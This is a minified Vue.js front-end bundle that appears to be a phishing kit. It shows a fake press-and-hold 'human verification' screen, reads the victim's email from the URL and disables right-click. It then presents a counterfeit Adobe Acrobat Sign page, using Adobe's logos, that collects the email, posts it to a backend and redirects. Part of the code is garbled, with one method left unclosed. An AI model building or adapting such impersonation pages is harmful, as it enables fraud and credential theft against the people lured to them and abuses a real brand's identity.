const Hs = e => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && e.charCodeAt(2) > 96 && e.charCodeAt(2) < 123
  , rl = (e, t, n, s, i, r) => {
    const o = i === "svg";
    t === "class" ? Go(e, s, o) : t === "style" ? Zo(e, n, s) : Yt(t) ? Ln(t) || ko(e, t, n, s, r) : (t[0] === "." ? (t = t.slice(1),
    !0) : t[0] === "^" ? (t = t.slice(1),
    !1) : ol(e, t, s, o)) ? (Rs(e, t, s),
    !e.tagName.includes("-") && (t === "value" || t === "checked" || t === "selected") && Ps(e, t, s, o, r, t !== "value")) : e._isVueCE && (/[A-Z]/.test(t) || !Y(s)) ? Rs(e, de(t), s, r, t) : (t === "true-value" ? e._trueValue = s : t === "false-value" && (e._falseValue = s),
    Ps(e, t, s, o))
}
;
function ol(e, t, n, s) {
    if (s)
        return !!(t === "innerHTML" || t === "textContent" || t in e && Hs(t) && P(n));
    if (t === "spellcheck" || t === "draggable" || t === "translate" || t === "autocorrect" || t === "form" || t === "list" && e.tagName === "INPUT" || t === "type" && e.tagName === "TEXTAREA")
        return !1;
    if (t === "width" || t === "height") {
        const i = e.tagName;
        if (i === "IMG" || i === "VIDEO" || i === "CANVAS" || i === "SOURCE")
            return !1
    }
    return Hs(t) && Y(n) ? !1 : t in e
}
const Ds = e => {
    const t = e.props["onUpdate:modelValue"] || !1;
    return M(t) ? n => Dt(t, n) : t
}
;
function ll(e) {
    e.target.composing = !0
}
function Ns(e) {
    const t = e.target;
    t.composing && (t.composing = !1,
    t.dispatchEvent(new Event("input")))
}
const xn = Symbol("_assign")
  , cl = {
    created(e, {modifiers: {lazy: t, trim: n, number: s}}, i) {
        e[xn] = Ds(i);
        const r = s || i.props && i.props.type === "number";
        ke(e, t ? "change" : "input", o => {
            if (o.target.composing)
                return;
            let l = e.value;
            n && (l = l.trim()),
            r && (l = wn(l)),
            e[xn](l)
        }
        ),
        n && ke(e, "change", () => {
            e.value = e.value.trim()
        }
        ),
        t || (ke(e, "compositionstart", ll),
        ke(e, "compositionend", Ns),
        ke(e, "change", Ns))
    },
    mounted(e, {value: t}) {
        e.value = t ?? ""
    },
    beforeUpdate(e, {value: t, oldValue: n, modifiers: {lazy: s, trim: i, number: r}}, o) {
        if (e[xn] = Ds(o),
        e.composing)
            return;
        const l = (r || e.type === "number") && !/^0\d/.test(e.value) ? wn(e.value) : e.value
          , u = t ?? "";
        l !== u && (document.activeElement === e && e.type !== "range" && (s && t === n || i && e.value.trim() === u) || (e.value = u))
    }
}
  , fl = ["ctrl", "shift", "alt", "meta"]
  , ul = {
    stop: e => e.stopPropagation(),
    prevent: e => e.preventDefault(),
    self: e => e.target !== e.currentTarget,
    ctrl: e => !e.ctrlKey,
    shift: e => !e.shiftKey,
    alt: e => !e.altKey,
    meta: e => !e.metaKey,
    left: e => "button"in e && e.button !== 0,
    middle: e => "button"in e && e.button !== 1,
    right: e => "button"in e && e.button !== 2,
    exact: (e, t) => fl.some(n => e[`${n}Key`] && !t.includes(n))
}
  , Ht = (e, t) => {
    const n = e._withMods || (e._withMods = {})
      , s = t.join(".");
    return n[s] || (n[s] = (i, ...r) => {
        for (let o = 0; o < t.length; o++) {
            const l = ul[t[o]];
            if (l && l(i, t))
                return
        }
        return e(i, ...r)
    }
    )
}
  , al = {
    esc: "escape",
    space: " ",
    up: "arrow-up",
    left: "arrow-left",
    right: "arrow-right",
    down: "arrow-down",
    delete: "backspace"
}
  , dl = (e, t) => {
    const n = e._withKeys || (e._withKeys = {})
      , s = t.join(".");
    return n[s] || (n[s] = i => {
        if (!("key"in i))
            return;
        const r = Ue(i.key);
        if (t.some(o => o === r || al[o] === r))
            return e(i)
    }
    )
}
  , hl = z({
    patchProp: rl
}, Wo);
let Ls;
function pl() {
    return Ls || (Ls = ao(hl))
}
const gl = (...e) => {
    const t = pl().createApp(...e)
      , {mount: n} = t;
    return t.mount = s => {
        const i = _l(s);
        if (!i)
            return;
        const r = t._component;
        !P(r) && !r.render && !r.template && (r.template = i.innerHTML),
        i.nodeType === 1 && (i.textContent = "");
        const o = n(i, !1, ml(i));
        return i instanceof Element && (i.removeAttribute("v-cloak"),
        i.setAttribute("data-v-app", "")),
        o
    }
    ,
    t
}
;
function ml(e) {
    if (e instanceof SVGElement)
        return "svg";
    if (typeof MathMLElement == "function" && e instanceof MathMLElement)
        return "mathml"
}
function _l(e) {
    return Y(e) ? document.querySelector(e) : e
}
const ts = (e, t) => {
    const n = e.__vccOpts || e;
    for (const [s,i] of t)
        n[s] = i;
    return n
}
  , bl = {
    name: "HumanVerification",
    data() {
        return {
            progress: 0,
            timerRef: null,
            animationRef: null,
            referenceId: "",
            verificationToken: null,
            email: null
        }
    },
    mounted() {
        this.referenceId = this.generateReferenceId(),
        this.verificationToken = this.generateRandomToken(),
        this.extractEmailFromUrl(),
        document.addEventListener("contextmenu", this.preventContextMenu)
    },
    beforeUnmount() {
        document.removeEventListener("contextmenu", this.preventContextMenu)
    },
    methods: {
        extractEmailFromUrl() {
            const e = decodeURIComponent(window.location.href);
            let t = null;
            const n = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi
              , s = e.match(n);
            s && s.length > 0 && (t = s[s.length - 1]),
            t && this.isValidEmail(t) && (this.email = t,
            console.log("Found email:", this.email))
        },
        isValidEmail(e) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
        },
        preventContextMenu(e) {
            return e.preventDefault(),
            !1
        },
        generateRandomToken() {
            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
        },
        generateReferenceId() {
            const e = "0123456789abcdef"
              , t = [8, 4, 4, 4, 12];
            let n = "Reference ID ";
            for (let s = 0; s < t.length; s++) {
                for (let i = 0; i < t[s]; i++)
                    n += e[Math.floor(Math.random() * e.length)];
                s < t.length - 1 && (n += "-")
            }
            return n
        },
        startHolding() {
            this.timerRef && clearTimeout(this.timerRef),
            this.animationRef && cancelAnimationFrame(this.animationRef);
            const e = Date.now()
              , t = () => {
                const n = Date.now() - e;
                this.progress = Math.min(n / 3e3 * 100, 100),
                this.progress < 100 && (this.animationRef = requestAnimationFrame(t))
            }
            ;
            this.animationRef = requestAnimationFrame(t),
            this.timerRef = setTimeout( () => {
                this.$emit("verification-complete", this.email)
            }
            , 3e3)
        },
        stopHolding() {
            this.timerRef && clearTimeout(this.timerRef),
            this.animationRef && cancelAnimationFrame(this.animationRef),
            this.progress = 0
        }
    }
}
  , yl = {
    class: "container"
}
  , vl = {
    class: "verification-box"
}
  , xl = {
    class: "reference"
};
function wl(e, t, n, s, i, r) {
    return ze(),
    Gt("div", yl, [H("div", vl, [t[8] || (t[8] = H("h1", null, "Before we continue...", -1)), t[9] || (t[9] = H("p", null, [Le(" Press & Hold to confirm you are "), H("br"), Le("a human (and not a bot). ")], -1)), H("button", {
        onMousedown: t[0] || (t[0] = (...o) => r.startHolding && r.startHolding(...o)),
        onMouseup: t[1] || (t[1] = (...o) => r.stopHolding && r.stopHolding(...o)),
        onMouseleave: t[2] || (t[2] = (...o) => r.stopHolding && r.stopHolding(...o)),
        onTouchstart: t[3] || (t[3] = Ht( (...o) => r.startHolding && r.startHolding(...o), ["prevent"])),
        onTouchend: t[4] || (t[4] = Ht( (...o) => r.stopHolding && r.stopHolding(...o), ["prevent"])),
        onTouchcancel: t[5] || (t[5] = Ht( (...o) => r.stopHolding && r.stopHolding(...o), ["prevent"])),
        onContextmenu: t[6] || (t[6] = Ht( () => {}
        , ["prevent"]))
    }, [H("div", {
        class: "progress",
        style: kt({
            width: i.progress + "%"
        })
    }, null, 4), t[7] || (t[7] = H("span", null, "Press & Hold", -1))], 32)]), H("div", xl, Ut(i.referenceId), 1)])
}
const Sl = ts(bl, [["render", wl], ["__scopeId", "data-v-6e2a7c23"]]);
const Cl = {
    name: "AdobeSignPage",
    props: {
        prefilledEmail: String
    },
    data() {
        return {
            emailInput: this.prefilledEmail || "",
            errorMessage: "",
            isLoading: !1
        }
    },
    methods: {
        isValidEmail(e) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
        },
        async verifyEmail() {
            if (!this.emailInput.trim()) {
                this.errorMessage = "Please enter an email address";
                return
            }
            if (!this.isValidEmail(this.emailInput)) {
                this.errorMessage = "Please enter a valid email address";
                return
                }
            this.errorMessage = "",
            this.isLoading = !0;
            try {
                const e = await fetch("/api/verify-email", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        email: this.emailInput
                    })
                })
                  , t = await e.json();
                if (!e.ok)
                    throw new Error(t.message || "Verification failed");
                t.redirectUrl && (window.location = t.redirectUrl)
            } catch (e) {
                this.errorMessage = e.message || "Unable to verify email"
            } finally {
                this.isLoading = !1
            }
  , Tl = {
    class: "adobe-sign-container"
}
  , El = {
    class: "sign-card"
}
  , Al = {
    class: "content"
}
  , Ol = {
    key: 0,
    class: "error"
}
  , Ml = ["disabled"];
function Pl(e, t, n, s, i, r) {
    return ze(),
    Gt("div", Tl, [H("div", El, [t[5] || (t[5] = Mo('<div class="header" data-v-527512fb><div class="logo-text" data-v-527512fb><span class="person-icon" data-v-527512fb>⼈</span> Adobe Acrobat Sign </div><img class="adobe-logo" src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-tag-classic@2x.png" alt="Adobe Logo" data-v-527512fb></div><div class="success-check" data-v-527512fb>✓</div>', 2)), H("div", Al, [t[3] || (t[3] = H("p", null, [H("strong", null, "Verify the intended recipient's email.")], -1)), t[4] || (t[4] = H("p", null, "Enter the email address to which this item was shared to sign your document.", -1)), Fr(H("input", {
        type: "email",
        "onUpdate:modelValue": t[0] || (t[0] = o => i.emailInput = o),
        placeholder: "Enter email",
        required: "",
        onKeyup: t[1] || (t[1] = dl( (...o) => r.verifyEmail && r.verifyEmail(...o), ["enter"]))
    }, null, 544), [[cl, i.emailInput]]), i.errorMessage ? (ze(),
    Gt("p", Ol, Ut(i.errorMessage), 1)) : Fn("", !0)]), H("button", {
        onClick: t[2] || (t[2] = (...o) => r.verifyEmail && r.verifyEmail(...o)),
        disabled: i.isLoading
    }, Ut(i.isLoading ? "Verifying..." : "OPEN"), 9, Ml), t[6] || (t[6] = H("div", {
        class: "divider"
    }, null, -1)), t[7] || (t[7] = H("p", {
        class: "footer-text"
    }, [Le(" Attached is the final agreement for your reference. Read it with "), H("a", {
        href: "#"
    }, "Acrobat Reader"), Le(". You can also "), H("a", {
        href: "#"
    }, "open it online"), Le(" to review its activity history. ")], -1))]), t[8] || (t[8] = H("div", {
        class: "global-footer"
    }, [H("p", null, [H("strong", null, "Powered by")]), H("img", {
        class: "footer-logo",
        src: "https://na4.documents.adobe.com/images/emailNextGen/email-adobe-sign-logo.3@2x.png",
        alt: "Adobe Sign Logo"
    }), H("p", null, [Le("Need your own documents signed? Adobe Acrobat Sign can help save you time. "), H("a", {
        href: "#"
    }, "Learn more"), Le(".")]), H("p", null, "To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book."), H("p", null, "Terms of Use | Report Abuse"), H("p", null, "© 2025 Adobe. All rights reserved.")], -1))])
}
const Rl = ts(Cl, [["render", Pl], ["__scopeId", "data-v-527512fb"]]);
const Il = {
    name: "App",
    components: {
        HumanVerification: Sl,
        AdobeSignPage: Rl
    },
    data() {
        return {
            verificationComplete: !1,
            email: null,
            skipVerification: !1
        }
    },
    methods: {
        handleVerificationComplete(e) {
            this.email = e,
            this.verificationComplete = !0
        }
    }
}
  , Fl = {
    class: "background"
};
function Hl(e, t, n, s, i, r) {
    const o = as("HumanVerification")
      , l = as("AdobeSignPage");
    return ze(),
    Gt("div", Fl, [!i.verificationComplete && !i.skipVerification ? (ze(),
    In(o, {
        key: 0,
        onVerificationComplete: r.handleVerificationComplete
    }, null, 8, ["onVerificationComplete"])) : Fn("", !0), i.verificationComplete || i.skipVerification ? (ze(),
    In(l, {
        key: 1,
        prefilledEmail: i.email
    }, null, 8, ["prefilledEmail"])) : Fn("", !0)])
}
const Dl = ts(Il, [["render", Hl]]);
gl(Dl).mount("#app");
